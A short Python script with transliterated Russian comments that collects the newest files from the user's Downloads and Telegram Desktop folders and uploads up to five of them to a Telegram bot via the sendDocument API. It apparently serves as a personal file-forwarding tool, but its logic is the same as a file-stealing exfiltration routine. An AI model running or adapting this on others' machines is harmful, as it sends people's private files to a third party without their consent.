import os
import requests
import glob

# --- NAS-TROY-KI ---
TOKEN = "BOT_TOKEN"
CHAT_ID = "CHAT_ID"

# Bazi put k Downloads
DOWNLOADS_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
# Put k Telegram Desktop vnutri Downloads
TG_DESKTOP_DIR = os.path.join(DOWNLOADS_DIR, "Telegram Desktop")

def send_file_to_tg(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    filename = os.path.basename(file_path)
    
    print(f"Otpravlyayu: {filename}...")
    try:
        with open(file_path, "rb") as file:
            payload = {"chat_id": CHAT_ID}
            files = {"document": (filename, file)}
            response = requests.post(url, data=payload, files=files)
            
            if response.status_code == 200:
                print(f"Uspekh! {filename} otpravlen.")
            else:
                print(f"Oshibka TG dlya {filename}: {response.text}")
    except Exception as e:
        print(f"Oshibka pri chtenii fayla {filename}: {e}")

def main():
    all_files = []
    
    # 1. Sobiraem fayli iz kornya Downloads
    if os.path.exists(DOWNLOADS_DIR):
        files_root = glob.glob(os.path.join(DOWNLOADS_DIR, "*.*"))
        all_files.extend([f for f in files_root if os.path.isfile(f)])
        
    # 2. Sobiraem fayli iz Telegram Desktop
    if os.path.exists(TG_DESKTOP_DIR):
        files_tg = glob.glob(os.path.join(TG_DESKTOP_DIR, "*.*"))
        all_files.extend([f for f in files_tg if os.path.isfile(f)])

    if not all_files:
        print("Nichego ne naydeno ni v Downloads, ni v Telegram Desktop.")
        return

    # Sortiruem VSE fayli po date (samie svezhie — pervie)
    all_files = sorted(all_files, key=os.path.getmtime, reverse=True)
    
    print(f"Vsego naydeno faylov: {len(all_files)}")
    
    # Ogranichenie, chtobi ne uspat bot (mozhno uvelichit)
    LIMIT = 5 
    
    for file_path in all_files[:LIMIT]:
        # Proverka na razmer (do 50 MB)
        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if file_size_mb > 50:
            print(f"Propusk: {os.path.basename(file_path)} slishkom bolshoy ({file_size_mb:.1f} MB)")
            continue
            
        send_file_to_tg(file_path)

if __name__ == "__main__":
    main()
